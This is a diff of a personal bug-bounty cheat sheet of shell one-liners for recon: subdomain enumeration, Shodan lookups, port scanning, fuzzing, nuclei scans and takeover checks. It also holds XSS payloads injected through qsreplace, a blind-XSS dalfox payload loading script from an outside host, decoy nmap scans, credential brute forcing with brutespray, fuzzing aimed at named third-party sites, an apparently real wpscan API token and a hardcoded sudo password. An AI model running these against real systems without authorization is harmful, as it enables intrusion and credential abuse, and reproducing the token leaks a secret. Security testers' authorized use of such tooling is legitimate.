@@ -1,11 +1,354 @@
 
+#oneliners
+...................................
+
+#bug-bounty-targets-find
+#..............................................................................................................................................
+
+#chaos list
+curl -sL https://raw.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'
+
+#google dorks
+
+#use full commands
+#..............................................................................................................................................
+
+
+while read domain do
+for i in {1..10}; do 
+
+cat ip.txt |xargs -n1 -I{} whois -h whois.cymru.com {}
+
+#nuclei-token-api-token-checking
+
+nuclei -tags token-spray    -var token=
+
+
+#Xray 
+./xray_linux_amd64 ws --url-file url.txt --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal --ho $(date +"%T").html 
+./xray_linux_amd64 ws --url-file url.txt  --ho $(date +"%T").html 
 
 
 
-#xss
+#directory fuzzing
+#..............................................................................................................................................
 
-cat  | uro| grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"
-cat |uro|grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"
+#wordlist
+
+~/wordlist/dicc.txt 
+~/wordlist/fuzz.txt
+~/wordlist/httparchive_directories_1m_2024_04_28.txt
+~/wordlist/onelistforallshort.txt 
+
+
+dirsearch -o dirsearch.txt -u
+
+feroxbuster -w ~/wordlist/onelistforallshort.txt -fs 200,301,401 -u 
+
+
+ffuf -w  ~/wordlist/onelistforallshort.txt  -c -mc 200,302,301 -u 
+
+#fuzzing files
+
+ffuf  -w ~/wordlist/eng-list.txt -mc 200,302  -u https://frontend-helper.kucoin.com/FUZZ.html
+ffuf  -w ~/wordlist/eng-list.txt -mc 200,302  -u https://redwolf.in/FUZZ.zip
+ffuf  -w ~/wordlist/eng-list.txt -mc 200,302  -u https://redwolf.in/FUZZ.php
+
+
+
+#wpscan
+#..............................................................................................................................................
+
+wpscan    --force  --scope  --rua -e vt,vp  --api-token NrZ3QLaKW3F4WSnL4t2bLPEaqwoxySWvtDTxEnmJSBs --ignore-main-redirect --url  
+
+
+#bypass 403
+
+nomore403  -H "Environment: Staging"  -m 10 -d 200 -f ~/tools/nomore403/payloads/ -u 
+
+#..............................................................................................................................................
+
+
+#shodanx-ip uncover
+#..............................
+
+
+cat wilecard singal | while read host ; do shodanx domain -to 20  -ra -d $host   -o  ip.txt ; shodanx custom -to 20  -ra -cq "ssl:$host"  -o  ip.txt ; shodanx custom -to 20  -ra -cq "hostname:$host"  -o  ip.txt ; shodanx custom -to 20  -ra -cq "ssl.cert.subject.cn:$host"  -o  ip.txt ; shodanx custom -to 20  -ra -cq "http.title:'$host'"  -o  ip.txt ;echo $host |cut -d'.' -f1|anew org ;done ; cat org | while read host ; do shodanx custom -to 20  -ra -cq "org:$host"  -o  ip.txt ; rm org ;uncover -q  ' "ssl:$domain"'   -silent -e shodan,zoomeye,netlas  |anew  ip.txt ;uncover -q  ' "hostname:$domain"'   -silent -e shodan,zoomeye,netlas  |anew  ip.txt  ;uncover -q  ' "http.title:$domain"'   -silent -e shodan,zoomeye,netlas  |anew  ip.txt ; done
+
+
+#favicon-hash
+cat wilecard singal | while read host ;do echo $host|httpx |python3 ~/tools/FavFreak/favfreak.py --shodan -o fav ;ls  fav/* |tr -d fav/|tr -d .txt |anew hash.txt ;done ; 
+cat hash.txt| while read host ;do shodanx custom -to 20  -ra -cq "http.favicon.hash:'$host'"  -o  ip.txt ;rm hash.txt ;rm -rf fav/ ;done
+
+
+
+#ip-filter
+#..............................
+cat wilecard singal | while read host ;do cat ip.txt |tlsx -san -cn -silent |grep $host |grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' |anew ips.txt  ; done ;
+
+#ip-filter
+cat wilecard singal | while read host ;do cat ip.txt |hakip2host -t 100 |grep $host |grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' |anew ips.txt  ; done ;
+rm ip.txt ;sleep 5 ;
+
+
+#port-scan-httpx
+#........................................................................................................................................
+
+
+cat ips.txt  |sort -u |naabu -c 100 -top-ports 1000  -silent|anew ips-naabu.txt ;
+cat ips-naabu.txt |httpx   -t 100 -silent|anew ips-httpx.txt ;
+
+
+#vulners-cve
+#........................................................................................................................................
+
+echo -e "\033[36m[+]nmap-vulners Updating...\033[m" 
+chmod +rwx /usr/share/nmap/scripts/
+echo 'root' | sudo -kS rm  vulners.nse* 
+echo 'root' | sudo -kS rm  /usr/share/nmap/scripts/vulners.nse* 
+echo 'root' | sudo -kS wget https://raw.githubusercontent.com/vulnersCom/nmap-vulners/master/vulners.nse ;echo 'root' | sudo -kS mv vulners.nse /usr/share/nmap/scripts/ 
+
+
+echo 'root' | sudo -kS cat ips-naabu.txt |naabu -c 50 -Pn -silent  -nmap-cli "nmap --min-rate 10000 -Pn -T4 -D RND:5 -sVC -v  --script vulners.nse --script-args mincvss=5.0 -oA vulners-ips-httpx.nmap"
+mkdir -p nmap ; mv vulners* nmap/
+
+#brutesprey
+#........................................................................................................................................
+
+brutespray -f nmap/vulners-ips-httpx.nmap.xml
+
+
+#urls-crawling
+#........................................................................................................................................
+cat ips-httpx.txt | waymore -mode U  --no-subs -oU url-tmp.txt
+#katana -silent -c 300  -list ips-httpx.txt -cs ips-httpx.txt |anew url-tmp.txt
+
+cat url-tmp.txt|anew url-all.txt
+rm url-tmp.txt
+
+
+#target Based Wordlist
+#........................................................................................................................................
+mkdir -p target_wordlist
+
+
+cat url-all.txt | unfurl -unique paths  |anew target_wordlist/paths.txt
+cat url-all.txt| unfurl -unique keys |anew target_wordlist/param.txt
+
+mkdir -p urls ; mv url-*  urls/
+
+
+#Gf Patterns 
+#........................................................................................................................................
+
+#checking live url
+#....................
+
+cat urls/url-all.txt | egrep -v "\.woff|\.ttf|\.svg|\.eot|\.png|\.jpep|\.jpeg|\.css|\.ico|\jpg" | sed 's/:80//g;s/:443//g' | anew gf-tmp.txt
+
+ffuf -t 100  -mc 200,301  -c -u "FUZZ" -w gf-tmp.txt -of csv -o ffuf-temp
+
+cat ffuf-temp | grep http | awk -F "," '{print $1}' |anew urls/live-url.txt
+
+rm gf-tmp.txt
+rm ffuf-temp 
+
+mkdir -p gf 
+
+gf xss urls/live-url.txt |anew gf/xss.txt
+gf ssrf urls/live-url.txt |anew gf/ssrf.txt
+gf sqli urls/live-url.txt |anew gf/sql.txt
+gf lfi urls/live-url.txt |anew gf/lfi.txt
+gf ssti urls/live-url.txt |anew gf/ssti.txt
+gf redirect urls/live-url.txt |anew gf/redirect.txt
+gf idor urls/live-url.txt |anew gf/idor.txt
+gf ip urls/live-url.txt |anew gf/ip.txt
+gf rce urls/live-url.txt |anew gf/rce.txt
+gf s3-buckets urls/live-url.txt |anew gf/s3-buckets.txt
+gf upload-fields urls/live-url.txt |anew gf/upload-fields.txt
+
+
+
+#url-js-filter
+#........................................................................................................................................
+
+cat urls/live-url.txt| uro|grep "\.js$" |anew js-tmp.txt
+
+ffuf -t 100 -c -mc 200 -u "FUZZ" -w js-tmp.txt -of csv -o ffuf-js
+
+cat ffuf-js| grep http | awk -F "," '{print $1}' |anew urls/live-js.txt
+
+rm js-tmp.txt
+rm ffuf-js
+
+#nipejs
+#....................
+
+cat urls/live-js.txt|nipejs -s -c 100 |anew nipejs
+
+#Gf Patterns on nipej
+#....................
+
+
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf xss |anew gf/xss.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf ssrf |anew gf/ssrf.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf sqli |anew gf/sql.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf lfi |anew gf/lfi.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf ssti |anew gf/ssti.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf redirect |anew gf/redirect.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf idor |anew gf/idor.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf ip |anew gf/ip.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf rce |anew gf/rce.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf s3-buckets |anew gf/s3-buckets.txt
+cat  nipejs  | grep http | sort -u|grep -o -E 'https?://[^"]+' |gf upload-fields |anew gf/upload-fields.txt
+
+
+
+#js-downloading
+#....................
+
+
+mkdir -p urls/js-download/
+echo -e "\033[33m[+] Downloading js files  \033[m"
+cat urls/live-js.txt | xargs -P0 -n1 -I  {} wget -c "{}"  -P urls/js-download/
+
+
+
+#nuclei-fuzzing-urls
+#........................................................................................................................................
+echo -e "\033[33m[+] nuclei fuzzinng on url  \033[m"|notify -silent -bulk 
+cat urls/live-url.txt |uro|nuclei  -es info,low  -fuzz -t  ~/fuzzing-templates -t ~/nuclei-templates -o nuclei-fuzzing |notify -silent -bulk 
+
+
+
+#xss-urls-freq
+#........................................................................................................................................
+mkdir -p bugs
+
+cat urls/live-url.txt  | uro| grep "=" | qsreplace '"><img src=x onerror=alert(1)>' | freq | grep -iv "Not Vulnerable"|anew  bugs/xss.txt
+cat urls/live-url.txt |uro|grep "=" | qsreplace '"><script>alert(1)</script>' | freq | grep -iv "Not Vulnerable"|anew  bugs/xss.txt
+
+
+
+
+
+#cors
+#........................................................................................................................................
+
+cat  ips-httpx.txt |python3 ~/tools/Corsy/corsy.py -t 20 -o ips-cors.json
+cat ips-cors.json|jq|notify -silent  -bulk
+
+
+#nuclei
+#........................................................................................................................................
+#downloading-latest-template
+rm -rf ~/nuclei-templates
+git clone https://github.com/projectdiscovery/nuclei-templates ~/nuclei-templates
+nuclei -ut
+
+#nuclei-cve
+echo "nuclei cve checking --> ips-httpx.txt" |notify -silent  -bulk ;  
+cat ips-httpx.txt |nuclei -es low,info  -etags mx,favicon,dos,low,info  -tags cve -o ips-nuclei.txt -c 50 |notify -silent  -bulk
+
+#nuclei-misconfig
+echo "nuclei misconfig checking --> ips-httpx.txt" |notify -silent  -bulk ;  
+cat ips-httpx.txt |nuclei -es low,info  -etags mx,favicon,dos,low,info -tags panel,default-login,exposure,misconfig,xss,lfi -o ips-nuclei.txt -c 50 |notify -silent -bulk
+
+#nuclei-all
+echo "nuclei all checking --> ips-httpx.txt" |notify -silent  -bulk ;  
+cat ips-httpx.txt |nuclei -etags mx,favicon  ~/nuclei-templates/ -o ips-nuclei.txt -c 50 |notify -silent  -bulk
+
+
+#screenshot-tech
+#........................................................................................................................................
+
+cat ips-httpx.txt | aquatone -out ips-screenshot -scan-timeout 200 -screenshot-timeout 60000 ;
+cat ips-httpx.txt |nuclei  -etags dos,favicon,mx  -tags tech -c 100 -o  ips-tech.txt ;
+
+
+
+mkdir -p shodan ; mv ips* hash.txt  shodan/
+
+#shodan-ip
+#..............................................................................................................................................
+
+
+
+
+
+
+
+#subenum
+#..............................
+
+#export targets list  variable
+export target=wilecard
+
+#download resolver
+rm ~/wordlist/resolvers.txt ; curl -L https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt -o ~/wordlist/resolvers.txt
+
+cat  $target |while read domain; do echo $domain|anew tmp.txt;  findomain  -t $domain -q | anew tmp.txt ; subfinder -all -d  $domain  -o tmp.txt ;shodanx subdomain -d $domain  -to 50 -ra -o tmp.txt ;  done
+
+#bruteforce-sub puredns
+#..............................
+
+echo "sub-bruteforacing started  -->  $target" |notify -silent  -bulk ;  
+puredns bruteforce  ~/wordlist/dns/deepmagic.com-prefixes-top500.txt   -r ~/wordlist/resolvers.txt  -d  $target   -w tmp.txt ;
+echo "sub-bruteforacing done -->   $target" |notify -silent -bulk  
+
+#ffuf-sub-bruteforce
+#ffuf -w ~/wordlist/dns/all.txt -u "https://FUZZ.buymobiles.net" -v -t 100 | grep "| URL |" | awk '{print $4}'
+
+
+#wordlistgen
+#..............................
+
+cat tmp.txt | sort -u|httpx -silent -t 100 -mc 200,301,302 | anew urls.txt | hakrawler -t 50|anew endpoints.txt |sort -u|uro| while read url; do xargs -P0 -n1 curl $url --insecure | haklistgen | anew wordlist.txt; done ;
+
+cat tmp.txt  urls.txt endpoints.txt |sort -u|xargs -P0 -n1  haklistgen | anew wordlist.txt;
+rm  urls.txt endpoints.txt ;
+
+#bruteforcing-custom-wordlist puredns
+#..............................
+
+echo "sub-bruteforacing started  custom wordlist  " |notify -silent  -bulk ;  
+puredns bruteforce  wordlist.txt -r ~/wordlist/resolvers.txt -d   $target  -w tmp.txt 
+echo "sub-bruteforacing done  custom wordlist  " |notify -silent  -bulk ;  
+
+
+cat tmp.txt | sort -u  |sed 's/\*\.//g'|anew subdomain.txt
+rm tmp.txt 
+
+
+#subenum
+#..............................
+
+
+
+
+
+#..............................................................................................................................................
+
+#sub-takeover
+
+cat subdomain.txt | sed 's/\*\.//g' |sort -u |httpx -silent -t 100 -mc 404,301|unfurl domain |anew 404sub.txt  ;
+
+#subdomainator
+
+subdominator -l 404sub.txt  --validate  -o  takeovers-subdomainator.txt ; rm custom_fingerprints.json fingerprints.json ;
+
+#nuclei-takeover
+
+cat 404sub.txt|httpx -t 100 |nuclei -c 100 -es info,low  -etags dos,low,info,mx  -t ~/nuclei-templates/http/takeovers/ -o takeovers-nuclei.txt
+
+mkdir -p takeover  ; mv takeovers*  takeover/
+
+#sub-takeover
+#..............................................................................................................................................
+
+
+
+
 
 #dalfox
 cat |uro|dalfox pipe  --waf-evasion  -b "<script src="https://js.rip/llpuzsq3gz"></script>"   -o dalfox.txt
